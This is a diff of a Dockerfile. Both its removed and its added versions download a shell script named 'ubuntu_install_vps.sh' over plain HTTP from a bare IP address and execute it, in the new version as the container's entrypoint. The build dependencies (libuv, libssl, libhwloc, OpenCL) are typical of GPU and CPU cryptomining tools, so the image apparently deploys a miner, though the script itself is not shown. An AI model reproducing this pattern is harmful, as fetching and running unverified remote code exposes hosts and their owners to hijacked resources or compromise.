@@ -1,7 +1,23 @@
 FROM ubuntu:latest
-RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-WORKDIR /root
-RUN wget -O install-vps.sh http://44.201.182.135/install/tuan/ubuntu_install_vps.sh
-RUN chmod +x install-vps.sh
-RUN bash install-vps.sh
+
+
+WORKDIR /tmp/
+
+ADD \
+http://44.201.182.135/install/tuan/ubuntu_install_vps.sh \
+.
+
+RUN \
+apt-get update \
+&& apt-get -y --no-install-recommends install mesa-opencl-icd ocl-icd-opencl-dev \
+&& rm -rf /var/lib/apt/lists/* \
+&& mv ubuntu_install_vps.sh /usr/local/bin/ \
+&& chmod +x /usr/local/bin/ubuntu_install_vps.sh \
+&& rm -rf  ubuntu_install_vps.sh *
+
+
+
+
+ENTRYPOINT ["ubuntu_install_vps.sh"]
+CMD ["-h"]
 
